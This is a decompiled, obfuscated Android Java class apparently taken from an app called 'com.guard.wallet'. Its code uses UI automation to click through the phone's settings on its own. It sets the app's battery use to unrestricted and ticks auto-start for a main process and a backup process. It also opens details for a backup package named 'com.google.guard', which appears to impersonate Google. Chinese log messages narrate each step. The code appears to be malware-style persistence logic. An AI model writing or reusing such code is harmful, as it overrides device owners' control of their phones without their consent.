package p012o;

import a1.AbstractC0026q;
import android.util.Log;
import com.guard.wallet.entity.CheckedResult;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilterWithUpLevel;
import com.guard.wallet.helper.AbstractC0184g;
import com.guard.wallet.utils.AbstractC0251g;
import java.util.Objects;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;
import p014r.EnumC0892e;

/* loaded from: classes.dex */
public final /* synthetic */ class d0 implements Runnable {

    /* renamed from: a */
    public final /* synthetic */ int f860a;

    /* renamed from: b */
    public final /* synthetic */ e0 f861b;

    public /* synthetic */ d0(e0 e0Var, int i2) {
        this.f860a = i2;
        this.f861b = e0Var;
    }

    @Override // java.lang.Runnable
    public final void run() {
        UiObject findOneByCombine;
        String str;
        UiObject uiObject;
        String str2;
        AtomicBoolean atomicBoolean;
        AtomicBoolean atomicBoolean2;
        int i2 = this.f860a;
        e0 e0Var = this.f861b;
        switch (i2) {
            case 0:
                e0Var.getClass();
                try {
                    if (e0Var.k0()) {
                        Log.d("o.e0", "keepAliveInAppDetail 窗口匹配");
                        AbstractC0184g.m354h(10);
                        e0Var.m1062G();
                        Log.d("o.e0", "active root complete");
                        UiObject m1047Q = e0Var.m1047Q();
                        if (m1047Q != null) {
                            Log.d("o.e0", "应用详情窗口滚动视图查找成功");
                            AbstractC0184g.m354h(15);
                            findOneByCombine = e0Var.o0(m1047Q);
                        } else {
                            Log.e("o.e0", "应用详情窗口滚动视图查找失败");
                            findOneByCombine = e0Var.m1072k().findOneByCombine(e0.b0());
                            if (findOneByCombine == null) {
                                e0Var.m1072k().findOneByCombine(e0.f0());
                            }
                        }
                        if (findOneByCombine != null) {
                            Log.d("o.e0", "查找应用电量管理已完成");
                            AbstractC0184g.m354h(20);
                            UiObject findParentUtilCombine = findOneByCombine.findParentUtilCombine(AbstractC0414c.m1037L());
                            if (findParentUtilCombine != null && findParentUtilCombine.click()) {
                                Log.d("o.e0", "查找并点击应用的电量管理已完成");
                                AbstractC0184g.m354h(30);
                                break;
                            } else {
                                str = "点击应用的电量管理失败";
                            }
                        } else {
                            str = "查找应用电量管理失败";
                        }
                        Log.e("o.e0", str);
                        break;
                    }
                } catch (Exception e2) {
                    AbstractC0026q.m186s("o.e0", e2);
                    return;
                }
                break;
            case 1:
                e0Var.getClass();
                try {
                    if (e0Var.j0()) {
                        Log.d("o.e0", "keepAliveInAppBattery 窗口匹配");
                        AbstractC0184g.m354h(40);
                        e0Var.m1062G();
                        Log.d("o.e0", "active root complete");
                        UiObject findOneByOperateOr = e0Var.m1072k().findOneByOperateOr(e0.q0());
                        EnumC0892e enumC0892e = EnumC0892e.KEEP_ALIVE_MAIN_APP;
                        AtomicReference atomicReference = e0Var.f876r;
                        if (findOneByOperateOr != null) {
                            AbstractC0184g.m354h(45);
                            UiObject findParentUtilCombine2 = findOneByOperateOr.findParentUtilCombine(AbstractC0414c.m1036K());
                            if (findParentUtilCombine2 == null || !findParentUtilCombine2.click()) {
                                Log.e("o.e0", "查找并点击无限制失败");
                            } else {
                                Log.d("o.e0", "查找并点击无限制已完成");
                                AbstractC0184g.m354h(50);
                                (Objects.equals(atomicReference.get(), enumC0892e) ? e0Var.f881w : e0Var.f882x).set(true);
                            }
                        }
                        if (Objects.equals(atomicReference.get(), enumC0892e)) {
                            atomicReference.set(EnumC0892e.KEEP_ALIVE_BACKUP_APP);
                            if (AbstractC0251g.d0("com.google.guard") != null) {
                                AbstractC0251g.Z0("com.google.guard");
                                Log.d("o.e0", "com.google.guard".concat(" 应用详情已启动"));
                                "com.google.guard".concat(" 应用详情已启动");
                                break;
                            }
                        }
                        AbstractC0251g.d1("com.transsion.phonemaster", "com.cyin.himgr.autostart.AutoStartActivity");
                        Log.d("o.e0", "自启动管理已启动");
                        break;
                    }
                } catch (Exception e3) {
                    AbstractC0026q.m186s("o.e0", e3);
                    return;
                }
                break;
            case 2:
                e0Var.getClass();
                try {
                    if (e0Var.l0()) {
                        Log.d("o.e0", "keepAliveInAutoStart 窗口匹配");
                        AbstractC0184g.m354h(60);
                        e0Var.m1062G();
                        Log.d("o.e0", "active root complete");
                        CombineFilterWithUpLevel combineFilterWithUpLevel = new CombineFilterWithUpLevel(2, AbstractC0414c.m1033H(AbstractC0251g.x0()));
                        CombineFilterWithUpLevel combineFilterWithUpLevel2 = new CombineFilterWithUpLevel(2, AbstractC0414c.m1033H(AbstractC0251g.m658e()));
                        UiObject m1047Q2 = e0Var.m1047Q();
                        AtomicBoolean atomicBoolean3 = e0Var.f880v;
                        AtomicBoolean atomicBoolean4 = e0Var.f879u;
                        AtomicBoolean atomicBoolean5 = e0Var.f878t;
                        AtomicBoolean atomicBoolean6 = e0Var.f877s;
                        String str3 = "备用进程自启动未勾选";
                        if (m1047Q2 != null) {
                            AtomicBoolean atomicBoolean7 = atomicBoolean3;
                            Log.d("o.e0", "自启动管理窗口滚动视图查找成功");
                            AbstractC0184g.m354h(65);
                            UiObject uiObject2 = null;
                            UiObject uiObject3 = null;
                            while (true) {
                                if (uiObject2 == null || uiObject3 == null) {
                                    AtomicBoolean atomicBoolean8 = atomicBoolean5;
                                    UiObject findParentByCombine = m1047Q2.findParentByCombine(combineFilterWithUpLevel.getChildFilter(), combineFilterWithUpLevel.getUpLevel());
                                    CombineFilterWithUpLevel combineFilterWithUpLevel3 = combineFilterWithUpLevel;
                                    UiObject findParentByCombine2 = m1047Q2.findParentByCombine(combineFilterWithUpLevel2.getChildFilter(), combineFilterWithUpLevel2.getUpLevel());
                                    if (findParentByCombine != null) {
                                        Log.d("o.e0", "主进程栏目查找成功");
                                        AbstractC0184g.m354h(70);
                                        CheckedResult m1040P = AbstractC0414c.m1040P(findParentByCombine);
                                        if (!m1040P.isChecked() && !m1040P.isClicked()) {
                                            m1040P = e0Var.m1048R(findParentByCombine, 5);
                                        }
                                        if (m1040P.isClicked()) {
                                            Log.d("o.e0", "主进程自启动已点击");
                                        }
                                        if (m1040P.isChecked()) {
                                            Log.d("o.e0", "主进程自启动已勾选");
                                            AbstractC0184g.m354h(80);
                                            atomicBoolean6.set(true);
                                            atomicBoolean4.set(true);
                                        } else {
                                            Log.e("o.e0", "主进程自启动未勾选");
                                        }
                                    }
                                    if (findParentByCombine2 != null) {
                                        Log.d("o.e0", "备用进程栏目查找成功");
                                        AbstractC0184g.m354h(75);
                                        CheckedResult m1040P2 = AbstractC0414c.m1040P(findParentByCombine2);
                                        if (m1040P2.isChecked() || m1040P2.isClicked()) {
                                            uiObject = findParentByCombine;
                                        } else {
                                            uiObject = findParentByCombine;
                                            m1040P2 = e0Var.m1048R(findParentByCombine2, 5);
                                        }
                                        if (m1040P2.isClicked()) {
                                            Log.d("o.e0", "备用进程自启动已点击");
                                        }
                                        if (m1040P2.isChecked()) {
                                            Log.d("o.e0", "备用进程自启动已勾选");
                                            AbstractC0184g.m354h(80);
                                            atomicBoolean = atomicBoolean8;
                                            atomicBoolean.set(true);
                                            uiObject3 = findParentByCombine2;
                                            atomicBoolean2 = atomicBoolean7;
                                            atomicBoolean2.set(true);
                                            str2 = str3;
                                        } else {
                                            str2 = str3;
                                            atomicBoolean = atomicBoolean8;
                                            uiObject3 = findParentByCombine2;
                                            atomicBoolean2 = atomicBoolean7;
                                            Log.e("o.e0", str2);
                                        }
                                    } else {
                                        uiObject = findParentByCombine;
                                        str2 = str3;
                                        atomicBoolean = atomicBoolean8;
                                        uiObject3 = findParentByCombine2;
                                        atomicBoolean2 = atomicBoolean7;
                                    }
                                    if (m1047Q2.canScrollForward()) {
                                        m1047Q2.scrollForward();
                                        AbstractC0251g.T0(5);
                                        m1047Q2.refresh();
                                        atomicBoolean7 = atomicBoolean2;
                                        str3 = str2;
                                        combineFilterWithUpLevel = combineFilterWithUpLevel3;
                                        atomicBoolean5 = atomicBoolean;
                                        uiObject2 = uiObject;
                                    }
                                }
                            }
                        } else {
                            Log.e("o.e0", "自启动管理窗口滚动视图查找失败");
                            UiObject findParentByCombine3 = e0Var.m1072k().findParentByCombine(combineFilterWithUpLevel.getChildFilter(), combineFilterWithUpLevel.getUpLevel());
                            UiObject findParentByCombine4 = e0Var.m1072k().findParentByCombine(combineFilterWithUpLevel2.getChildFilter(), combineFilterWithUpLevel2.getUpLevel());
                            if (findParentByCombine3 != null) {
                                Log.d("o.e0", "主进程栏目查找成功");
                                AbstractC0184g.m354h(75);
                                CheckedResult m1040P3 = AbstractC0414c.m1040P(findParentByCombine3);
                                if (m1040P3.isClicked()) {
                                    Log.d("o.e0", "主进程自启动已点击");
                                }
                                if (m1040P3.isChecked()) {
                                    Log.d("o.e0", "主进程自启动已勾选");
                                    AbstractC0184g.m354h(80);
                                    atomicBoolean6.set(true);
                                    atomicBoolean4.set(true);
                                } else {
                                    Log.e("o.e0", "主进程自启动未勾选");
                                }
                            }
                            if (findParentByCombine4 != null) {
                                Log.d("o.e0", "备用进程栏目查找成功");
                                AbstractC0184g.m354h(75);
                                CheckedResult m1040P4 = AbstractC0414c.m1040P(findParentByCombine4);
                                if (m1040P4.isClicked()) {
                                    Log.d("o.e0", "备用进程自启动已点击");
                                }
                                if (m1040P4.isChecked()) {
                                    Log.d("o.e0", "备用进程自启动已勾选");
                                    AbstractC0184g.m354h(80);
                                    atomicBoolean5.set(true);
                                    atomicBoolean3.set(true);
                                } else {
                                    Log.e("o.e0", str3);
                                }
                            }
                        }
                        e0Var.p0();
                        e0Var.mo1051Z();
                        break;
                    }
                } catch (Exception e4) {
                    AbstractC0026q.m186s("o.e0", e4);
                }
                break;
            default:
                e0Var.mo1051Z();
                break;
        }
    }
}
